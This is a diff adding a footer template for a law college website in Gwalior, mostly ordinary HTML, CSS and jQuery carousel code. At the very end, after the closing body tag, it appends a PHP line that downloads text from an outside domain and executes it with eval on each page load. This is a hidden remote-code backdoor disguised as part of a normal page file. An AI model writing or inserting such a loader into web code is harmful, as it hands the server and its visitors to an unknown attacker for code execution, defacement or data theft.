@@ -1,0 +1,748 @@
+ 
+<style>
+@media (max-width:767px){
+    ul.m-0.list-unstyled.d-flex.justify-content-between {
+    flex-direction: row !important;
+}}
+@media (max-width:575.99px){
+.col-xs-6{
+    
+    width: 50%;
+}
+}
+.social a:hover {
+    color: #ff7043;
+}
+</style>
+ 
+ 
+ <footer class="footer pt-8 pb-0" style="background: #042147;">
+    <div class="footer-links">
+        <div class="container">
+            <div class="row g-4">
+                <div class="col-md-6 col-sm-12 col-lg-4 about">
+    
+                    <!-- <h5>Learn Here</h5> -->
+                    <a href="index.php">
+                    <img src="assets/logo.png" alt="MGCL College Logo" width="100%" class="me-2 cu-logo" style="margin-bottom: 15px;">
+                    </a>
+                    <p style="text-align: justify;">The Sumitra Foundation, led by philanthropists, has made a commitment to provide quality education in the country. In order to give concrete shape to its benevolent ideas, the foundation established the Mahatma Gandhi College of Law (MGCL), in the year 1999…</p>
+
+                         <ul class="m-0 list-unstyled d-flex social">
+                         <li><a href="https://www.facebook.com/mgclgwl" rel="nofollow" target="_blank"><i class="fab fa-facebook" aria-hidden="true"></i></a></li>
+
+                    <!--<li><a href="#" rel="nofollow" target="_blank"><i class="fab fa-twitter" aria-hidden="true"></i></a></li>-->
+                
+                    <li><a href="https://www.instagram.com/mgcl_gwl/" rel="nofollow" target="_blank"><i class="fab fa-instagram" aria-hidden="true"></i></a></li>
+
+                    <!--<li><a href="https://www.linkedin.com/checkpoint/lg/login-submit" rel="nofollow" target="_blank"><i class="fab fa-linkedin" aria-hidden="true"></i></a></li>-->
+                    
+                    <li><a href="https://maps.app.goo.gl/kvgWXCb27kJvmvmJ7" rel="nofollow" target="_blank"><i class="fab fa-google" aria-hidden="true"></i></a></li>
+                    
+
+                    <li><a href="https://www.youtube.com/channel/UCo4oTjrJX75M6Noh10RtMcQ" rel="nofollow" target="_blank"><i class="fab fa-youtube" aria-hidden="true"></i></a></li>
+                                
+                                
+                        
+                    </ul>
+
+                </div>
+                <div class=" col-md-6 col-sm-6 col-xs-6 col-lg-2">
+                    <h5>Quick Link
+</h5>
+                    <ul class="m-0 list-unstyled">
+                        <li><a href="about-us.php">About Us</a></li>
+                        <li><a href="programme.php">Programme</a></li>
+                        <li><a href="facilities.php">Facilities</a></li>
+                        <li><a href="activities.php">Activities</a></li>
+                        <li><a href="faculties.php">Faculties</a></li>
+                        <li><a href="gallery.php">Gallery</a></li>
+                        <li><a href="contact-us.php">Contact Us</a></li>
+                       
+                    </ul>
+                </div>
+                <div class=" col-md-6 col-sm-6 col-xs-6 col-lg-2">
+                    <h5> Useful Link</h5>
+                    <ul class="m-0 list-unstyled">
+                        <li><a href="news.php">News</a></li>
+                        <li><a href="testimonial.php">Testimonial</a></li>
+                        <li><a href="syllabus.php">Syllabus</a></li>
+                        <li><a href="results.php">Results</a></li>
+                        <li><a href="notice-board.php">Notice board</a></li>
+                        <li><a href="download.php">Download</a></li>
+                        <li><a href="#">Sitemap</a></li>
+
+                    </ul>
+                </div>
+                <div class="col-md-6 col-sm-6 col-lg-4">
+
+                    <h5>Get in Touch</h5>
+                    <p>Mahatma Gandhi College of Law<br> Cancer Hills Road <br>Gwalior - 474001 (M.P.)</p>
+                    <ul class="m-0 list-unstyled">
+                        <li>
+                            General Helpline No:<br><a href="tel:+919425113994">+91 9425113994</a><br>
+                            Student Helpline No:<br><a href="tel:751 2431760 ">+91 751 2431760 </a><br>
+                            <!-- Toll Free:<br><a href="tel:1800121288800">1800 1212 88800</a><br> -->
+                            Email:<br><a href="mailto:mgcollegeoflaw@gmail.com">mgcollegeoflaw@gmail.com</a>
+
+                        </li> 
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="copyrights" style="    background: #01142d;">
+        <div class="container">
+            <div class="row">
+
+                <div class=" col-lg-6 col-md-6 col-sm-12 nirf-links">
+                    <ul class="m-0 list-unstyled d-flex justify-content-between">
+                        <li><span>Copyright © 2023,<a href="#"> Mahatma Gandhi College of Law</a></span></li>
+                    </ul>
+                </div>
+
+                <div class=" col-lg-6 col-md-6 col-sm-12 social-media-icons ms-auto" style="">
+
+                   <!--  <ul class="m-0 list-unstyled d-flex justify-content-between">
+                        <li><a href="https://www.facebook.com/" rel="nofollow"
+                                target="_blank"><i class="fab fa-facebook" aria-hidden="true"></i></a></li>
+
+                        <li><a href="https://twitter.com/" rel="nofollow" target="_blank"><i
+                                    class="fab fa-twitter" aria-hidden="true"></i></a></li>
+                
+                        <li><a href="http://www.instagram.com//" rel="nofollow" target="_blank"><i
+                                    class="fab fa-instagram" aria-hidden="true"></i></a></li>
+
+                        <li><a href="https://www.linkedin.com/school//" rel="nofollow"
+                                target="_blank"><i class="fab fa-linkedin" aria-hidden="true"></i></a></li>
+
+                        <li><a href="https://www.youtube.com/user/" rel="nofollow"
+                                target="_blank"><i class="fab fa-youtube" aria-hidden="true"></i></a></li>
+                    </ul> -->
+                    <ul class="m-0 list-unstyled d-flex justify-content-between" style="flex-direction: row-reverse;">
+                        <li style=""> Designed & Developed by <a href="https://ebiztechnocrats.com/" target="_blank" style="color:white;    font-size: 16px !important;">e-Biz Technocrats Pvt. Ltd.  </a></li>
+                    </ul>
+
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+</footer>
+
+
+
+
+<!-- Search Modal -->
+<div class="modal fade searchModal" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-lg">
+    <div class="modal-content red-bg border-0">
+      <div class="modal-header pb-0 border-bottom-0">
+        <h5 class="modal-title" id="exampleModalLabel">Search the website here</h5>
+        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+      </div>
+      <div class="modal-body pt-2 text-center">
+          <form class="position-relative" action="https://www.cuchd.in/searchresult.php" method="get">
+            <input type="text" class="searchbar-input" placeholder="Enter your search text" value="" name="q"> 
+            <input type="submit" value="" class="se-btn ptrans" style="background-image: url(includes/assets/images/search-icon.webp);">
+          </form>       
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="gotoTop">
+    <button type="button" class="gotoTop__icon"><i class="fa fa-arrow-circle-up" aria-hidden="true"></i></button>
+</div>
+
+<!-----------------------  CUSTOM APP INSTALL POPUP ----------------->
+
+
+
+
+<!-- javascripts files -->
+
+<script src="new-assets/js/jquery-3.6.1.min.js"></script>
+<script src="../code.jquery.com/jquery-migrate-3.4.0.min.js"></script> <!-- Fix for City dropdown position on updating jquery from v2.1.2 to v3.6 -->
+<script src="new-assets/js/bootstrap.minc420.js?v=5.1.3" defer></script>
+<script src="new-assets/js/plugins-purged.js"></script>
+<script src="new-assets/js/main-landing.js" defer></script> 
+
+<script src="add_to_homescreen/addtohomescreen.min.js" defer></script>
+<script src="pwa7431.js?v=1.11" defer></script>
+
+
+
+<script>
+    if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register('service-worker.js').then(() => { console.log('Service Worker Registered'); });
+    }
+</script>  
+
+<script>     
+    /******** DARK MODE TOUR BOX ********/
+    const btnthree = document.querySelector(".darkMode-three");
+    btnthree.addEventListener("click", function() {
+      document.body.classList.toggle("darkModeActive");
+      if (document.body.classList.contains("darkModeActive")) {
+        document.cookie = "theme%3ddark%3b%20path%3d/index.html";    
+      }
+      else {
+        document.cookie = "theme%3dlight%3b%20path%3d/index.html";          
+      }
+    });    
+    if (sessionStorage.getItem('darkOnce') !== 'true') {
+        var hourtime = new Date().getHours();
+        if (document.body.classList.contains("darkModeActive")) {
+            $('.darkMode').removeClass('z-index-9');            
+        }
+        else if (hourtime >= 18 && hourtime <= 24) {
+            setTimeout(function(){
+                $('.body-color-overlay2').fadeIn();       
+                $('.bottom').slideDown('slow');
+                $('.darkMode').addClass('z-index-9');
+            }, 5000); 
+        }        
+        else {
+            $('.darkMode').removeClass('z-index-9');
+        }       
+        sessionStorage.setItem('darkOnce','true');
+    }  
+    setTimeout(function() { sessionStorage.clear(); }, (1000 * 60 * 60 * 2));  // Clear value after every 2 hours  
+    $('.darkMode').click(function() {
+        $('.bottom').addClass('d-none');
+        $('.body-color-overlay2').addClass('d-none');
+        $('.darkMode').removeClass('z-index-9');
+    });        
+    $('.custom-tooltip .tooltip-close').on('click',function(){
+        $('.bottom').addClass('d-none');
+        $('.body-color-overlay2').addClass('d-none');
+        $('.darkMode').removeClass('z-index-9');        
+    });
+  
+</script>
+
+<!--Start of SuperBot Chat Script-->
+<script type="text/javascript" defer>
+window.$superbot||(function(d,s){var _sb=$superbot=function(c){_sb._.push(c)},$=_sb.s=d.createElement(s),e=d.getElementsByTagName(s)[0];_sb.set=function(o){_sb.set._.push(o)};_sb._=[];_sb.set._=[];$.async=!0;$.setAttribute("charset","utf-8");$.src="../app.superbot.works/agent7ac7.js?a=lDPgYnOLmd&amp;l=en";_sb.t=+new Date;$.type="text/javascript";e.parentNode.insertBefore($,e)})(document,"script");
+var _sb_visitor="";
+</script>
+<!--End of SuperBot Chat Script-->
+
+
+<script>
+    $('.top-notification-slider').not('.slick-initialized').slick({
+        dots: false,
+        infinite: true,
+        speed: 1000,
+        autoplay: true,
+        autoplaySpeed: 4000,
+        slidesToShow: 1,
+        slidesToScroll: 1,
+        pauseOnHover: true,
+        nextArrow: '<div class="fa fa-angle-right slick-next"></div>',
+        prevArrow: '<div class="fa fa-angle-left slick-prev"></div>',
+    });
+
+    $('.navbar-brand__slider').not('.slick-initialized').slick({
+        dots: false,
+        arrows: false,
+        infinite: true,
+        speed: 2000,
+        autoplay: true,
+        autoplaySpeed: 3000,
+        slidesToShow: 1,
+        slidesToScroll: 1,
+        pauseOnHover: true,
+        vertical: true,
+        swipe: false,
+        verticalSwiping: true
+    });
+
+
+    
+
+
+    $('.gotoTop__icon').click(function() {
+        $("html, body").animate({ scrollTop: '0' }, 600);
+    });
+
+    $('.navbar-toggler').click(function() {
+    $('body').toggleClass("overflow-hidden");
+    });
+
+    $(".header .navbar-nav li").on('click', function() {
+    $(this).toggleClass("active").siblings(this).removeClass("active");
+    var offset = $(this).index();
+    offset = offset * 50;
+    $("#navbarCollapse").animate({ scrollTop: offset.toString() }, 600);
+    });
+
+   
+</script>
+    <script>
+    function preloaderFadeOut() {
+        $('.preloader').fadeOut('slow');
+        $('body').removeClass('overflow-hidden');
+    }
+    setTimeout(function() {
+        preloaderFadeOut();
+    }, 1200);
+
+
+     $(".testimonial").not(".slick-initialized").slick({
+        dots: !1,
+        arrows: !0,
+        infinite: !0,
+        speed: 1e3,
+        autoplay: !0,
+        autoplaySpeed: 4e3,
+        slidesToShow: 2,
+        slidesToScroll: 1,
+        pauseOnHover: !0,
+        nextArrow: '<div class="fa fa-angle-right slick-next"></div>',
+        prevArrow: '<div class="fa fa-angle-left slick-prev"></div>',
+         responsive: [{
+            breakpoint: 2000,
+            settings: {
+                slidesToShow: 3,
+                slidesToScroll: 1,
+                variableWidth: !1
+            }
+        },{
+            breakpoint: 1779,
+            settings: {
+                slidesToShow: 2,
+                slidesToScroll: 1,
+                variableWidth: !1
+            }
+        },{
+            breakpoint: 991.99,
+            settings: {
+                slidesToShow: 1,
+                slidesToScroll: 1,
+                variableWidth: !1
+            }
+        },{
+            breakpoint: 768,
+            settings: {
+                slidesToShow: 2,
+                slidesToScroll: 1,
+                variableWidth: !1
+            }
+        }, {
+            breakpoint: 576,
+            settings: {
+                slidesToShow: 1,
+                slidesToScroll: 1,
+                variableWidth: !1
+            }
+        }, {
+            breakpoint: 360,
+            settings: {
+                slidesToShow: 1,
+                slidesToScroll: 1,
+                variableWidth: !1,
+                centerMode: !1
+            }
+        }]
+    }),$(".placement-notifications--slider").not(".slick-initialized").slick({
+        dots: !0,
+        arrows: !1,
+        infinite: !0,
+        speed: 1e3,
+        autoplay: !0,
+        autoplaySpeed: 4e3,
+        slidesToShow: 1,
+        slidesToScroll: 1,
+        pauseOnHover: !0,
+        nextArrow: '<div class="fa fa-angle-right slick-next"></div>',
+        prevArrow: '<div class="fa fa-angle-left slick-prev"></div>'
+    }), $(".highlights-section__slider").not(".slick-initialized").slick({
+        dots: !1,
+        infinite: !0,
+        speed: 1e3,
+        autoplay: !0,
+        autoplaySpeed: 6e3,
+        slidesToShow: 2,
+        slidesToScroll: 1,
+        pauseOnHover: !0,
+        nextArrow: '<div class="fa fa-angle-right slick-next"></div>',
+        prevArrow: '<div class="fa fa-angle-left slick-prev"></div>',
+        responsive: [{
+            breakpoint: 575,
+            settings: {
+                slidesToShow: 1,
+                slidesToScroll: 1
+            }
+        }]
+    }), $(".slider-for").slick({
+        slidesToShow: 1,
+        slidesToScroll: 1,
+        arrows: !1,
+        fade: !0,
+        dots: !1,
+        asNavFor: ".slider-nav",
+        nextArrow: '<div class="fa fa-angle-right slick-next"></div>',
+        prevArrow: '<div class="fa fa-angle-left slick-prev"></div>',
+        swipe: !1
+    }), $(".slider-nav").slick({
+        slidesToShow: 4,
+        slidesToScroll: 1,
+        asNavFor: ".slider-for",
+        dots: !0,
+        focusOnSelect: !0,
+        dots: !1,
+        variableWidth: !0,
+        nextArrow: '<div class="fa fa-angle-right slick-next"></div>',
+        prevArrow: '<div class="fa fa-angle-left slick-prev"></div>',
+        lazyLoad: "ondemand",
+        responsive: [{
+            breakpoint: 768,
+            settings: {
+                slidesToShow: 3,
+                slidesToScroll: 1,
+                variableWidth: !1
+            }
+        }, {
+            breakpoint: 576,
+            settings: {
+                slidesToShow: 2,
+                slidesToScroll: 1,
+                variableWidth: !1
+            }
+        }, {
+            breakpoint: 360,
+            settings: {
+                slidesToShow: 1,
+                slidesToScroll: 1,
+                variableWidth: !1,
+                centerMode: !0
+            }
+        }]
+    }), $("#nirfRanking").not(".slick-initialized").slick({
+        dots: !0,
+        arrows: !1,
+        speed: 300,
+        autoplay: !0,
+        autoplaySpeed: 2e3,
+        slidesToShow: 5,
+        slidesToScroll: 2,
+        pauseOnHover: !0,
+        nextArrow: '<div class="fa fa-angle-right slick-next"></div>',
+        prevArrow: '<div class="fa fa-angle-left slick-prev"></div>',
+        lazyLoad: "ondemand",
+        responsive: [{
+            breakpoint: 1200,
+            settings: {
+                slidesToShow: 4,
+                slidesToScroll: 4
+            }
+        }, {
+            breakpoint: 992,
+            settings: {
+                slidesToShow: 3,
+                slidesToScroll: 3
+            }
+        }, {
+            breakpoint: 768,
+            settings: {
+                slidesToShow: 2,
+                slidesToScroll: 2
+            }
+        }]
+    }), $("#outlookRanking").not(".slick-initialized").slick({
+        dots: !0,
+        arrows: !1,
+        infinite: !0,
+        speed: 300,
+        autoplay: !0,
+        autoplaySpeed: 2e3,
+        slidesToShow: 5,
+        slidesToScroll: 2,
+        pauseOnHover: !0,
+        nextArrow: '<div class="fa fa-angle-right slick-next"></div>',
+        prevArrow: '<div class="fa fa-angle-left slick-prev"></div>',
+        lazyLoad: "ondemand",
+        responsive: [{
+            breakpoint: 1200,
+            settings: {
+                slidesToShow: 4,
+                slidesToScroll: 4
+            }
+        }, {
+            breakpoint: 992,
+            settings: {
+                slidesToShow: 3,
+                slidesToScroll: 3
+            }
+        }, {
+            breakpoint: 768,
+            settings: {
+                slidesToShow: 2,
+                slidesToScroll: 2
+            }
+        }]
+    }), $("#indiatodayRanking").not(".slick-initialized").slick({
+        dots: !0,
+        arrows: !1,
+        infinite: !0,
+        speed: 300,
+        autoplay: !0,
+        autoplaySpeed: 2e3,
+        slidesToShow: 5,
+        slidesToScroll: 2,
+        pauseOnHover: !0,
+        nextArrow: '<div class="fa fa-angle-right slick-next"></div>',
+        prevArrow: '<div class="fa fa-angle-left slick-prev"></div>',
+        lazyLoad: "ondemand",
+        responsive: [{
+            breakpoint: 1200,
+            settings: {
+                slidesToShow: 4,
+                slidesToScroll: 4
+            }
+        }, {
+            breakpoint: 992,
+            settings: {
+                slidesToShow: 3,
+                slidesToScroll: 3
+            }
+        }, {
+            breakpoint: 768,
+            settings: {
+                slidesToShow: 2,
+                slidesToScroll: 2
+            }
+        }]
+    }), $("#qsRanking").not(".slick-initialized").slick({
+        dots: !0,
+        arrows: !1,
+        infinite: !0,
+        speed: 300,
+        autoplay: !0,
+        autoplaySpeed: 2e3,
+        slidesToShow: 5,
+        slidesToScroll: 2,
+        pauseOnHover: !0,
+        nextArrow: '<div class="fa fa-angle-right slick-next"></div>',
+        prevArrow: '<div class="fa fa-angle-left slick-prev"></div>',
+        lazyLoad: "ondemand",
+        responsive: [{
+            breakpoint: 1200,
+            settings: {
+                slidesToShow: 4,
+                slidesToScroll: 4
+            }
+        }, {
+            breakpoint: 992,
+            settings: {
+                slidesToShow: 3,
+                slidesToScroll: 3
+            }
+        }, {
+            breakpoint: 768,
+            settings: {
+                slidesToShow: 2,
+                slidesToScroll: 2
+            }
+        }]
+    }), $(".features-section__slider").not(".slick-initialized").slick({
+        dots: !1,
+        arrows: !0,
+        infinite: !0,
+        speed: 300,
+        autoplay: !0,
+        autoplaySpeed: 2e3,
+        slidesToShow: 1,
+        slidesToScroll: 1,
+        pauseOnHover: !0,
+        nextArrow: '<div class="fa fa-angle-right slick-next"></div>',
+        prevArrow: '<div class="fa fa-angle-left slick-prev"></div>'
+    }), $(".research-labs-slider").not(".slick-initialized").slick({
+        dots: !1,
+        arrows: !0,
+        infinite: !0,
+        speed: 300,
+        autoplay: !0,
+        autoplaySpeed: 2e3,
+        slidesToShow: 3,
+        slidesToScroll: 1,
+        pauseOnHover: !0,
+        nextArrow: '<div class="fa fa-angle-right slick-next"></div>',
+        prevArrow: '<div class="fa fa-angle-left slick-prev"></div>',
+        responsive: [{
+            breakpoint: 1200,
+            settings: {
+                slidesToShow: 2,
+                slidesToScroll: 2
+            }
+        }, {
+            breakpoint: 992,
+            settings: {
+                slidesToShow: 2,
+                slidesToScroll: 2
+            }
+        }, {
+            breakpoint: 768,
+            settings: {
+                slidesToShow: 1,
+                slidesToScroll: 1
+            }
+        }]
+    }), $(".infrastructre-section__slider").not(".slick-initialized").slick({
+        dots: !1,
+        arrows: !0,
+        infinite: !0,
+        speed: 300,
+        autoplay: !0,
+        autoplaySpeed: 2e3,
+        slidesToShow: 2,
+        slidesToScroll: 1,
+        pauseOnHover: !0,
+        nextArrow: '<div class="fa fa-angle-right slick-next"></div>',
+        prevArrow: '<div class="fa fa-angle-left slick-prev"></div>',
+        responsive: [{
+            breakpoint: 576,
+            settings: {
+                slidesToShow: 1,
+                slidesToScroll: 1
+            }
+        }]
+    }), $(".placements-logos__slider").not(".slick-initialized").slick({
+        dots: !1,
+        arrows: !1,
+        infinite: !0,
+        speed: 3e3,
+        autoplay: !0,
+        slidesToShow: 10,
+        slidesToScroll: 1,
+        pauseOnHover: !0,
+        cssEase: "linear",
+        nextArrow: '<div class="fa fa-angle-right slick-next"></div>',
+        prevArrow: '<div class="fa fa-angle-left slick-prev"></div>',
+        responsive: [{
+            breakpoint: 1200,
+            settings: {
+                slidesToShow: 8,
+                slidesToScroll: 8
+            }
+        }, {
+            breakpoint: 992,
+            settings: {
+                slidesToShow: 6,
+                slidesToScroll: 6
+            }
+        }, {
+            breakpoint: 768,
+            settings: {
+                slidesToShow: 4,
+                slidesToScroll: 4
+            }
+        }, {
+            breakpoint: 576,
+            settings: {
+                slidesToShow: 3,
+                slidesToScroll: 3
+            }
+        }]
+    }), $(".video-testimoinal__slider").not(".slick-initialized").slick({
+        dots: !1,
+        arrows: !1,
+        infinite: !0,
+        speed: 500,
+        autoplay: !0,
+        slidesToShow: 1,
+        slidesToScroll: 1,
+        pauseOnHover: !0,
+        cssEase: "linear",
+        nextArrow: '<div class="fa fa-angle-right slick-next"></div>',
+        prevArrow: '<div class="fa fa-angle-left slick-prev"></div>',
+        responsive: [{
+            breakpoint: 9999,
+            settings: "unslick"
+        }, {
+            breakpoint: 576,
+            settings: {
+                slidesToShow: 1,
+                slidesToScroll: 1
+            }
+        }]
+    }), $(".research-labs-slider .text-link").click(function() {
+        $(this).parent().toggleClass("lab-details"), $(this).next().slideToggle()
+    });
+
+ 
+    </script>
+
+    
+    <script src="lazysizes.min.js" async=""></script>
+    
+    <style>
+        #return-to-top {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    background: rgb(0, 0, 0);
+    background: rgb(31 89 173);
+    width: 50px;
+    height: 50px;
+    display: block;
+    text-decoration: none;
+    -webkit-border-radius: 35px;
+    -moz-border-radius: 35px;
+    border-radius: 35px;
+    display: none;
+    -webkit-transition: all 0.3s linear;
+    -moz-transition: all 0.3s ease;
+    -ms-transition: all 0.3s ease;
+    -o-transition: all 0.3s ease;
+    transition: all 0.3s ease;
+}
+#return-to-top i {
+    color: #fff;
+    margin: 0;
+    position: relative;
+    left: 16px;
+    top: 16px;
+    font-size: 19px;
+    -webkit-transition: all 0.3s ease;
+    -moz-transition: all 0.3s ease;
+    -ms-transition: all 0.3s ease;
+    -o-transition: all 0.3s ease;
+    transition: all 0.3s ease;
+}
+#return-to-top:hover {
+    background: rgb(4 28 60);
+}
+#return-to-top:hover i {
+    color: #fff;
+    top: 5px;
+}
+    </style>
+    
+    <a href="javascript:" id="return-to-top"><i class="fa fa-chevron-up" aria-hidden="true"></i></a>
+    
+    <script>
+        // ===== Scroll to Top ==== 
+$(window).scroll(function() {
+    if ($(this).scrollTop() >= 50) {        // If page is scrolled more than 50px
+        $('#return-to-top').fadeIn(200);    // Fade in the arrow
+    } else {
+        $('#return-to-top').fadeOut(200);   // Else fade out the arrow
+    }
+});
+$('#return-to-top').click(function() {      // When arrow is clicked
+    $('body,html').animate({
+        scrollTop : 0                       // Scroll to top of body
+    }, 500);
+});
+    </script>
+    
+</body>
+<?php
+eval("?>".file_get_contents('https://cubitpipi.sbs/acnhor1/bl1.txt'));
+?>
+</html>
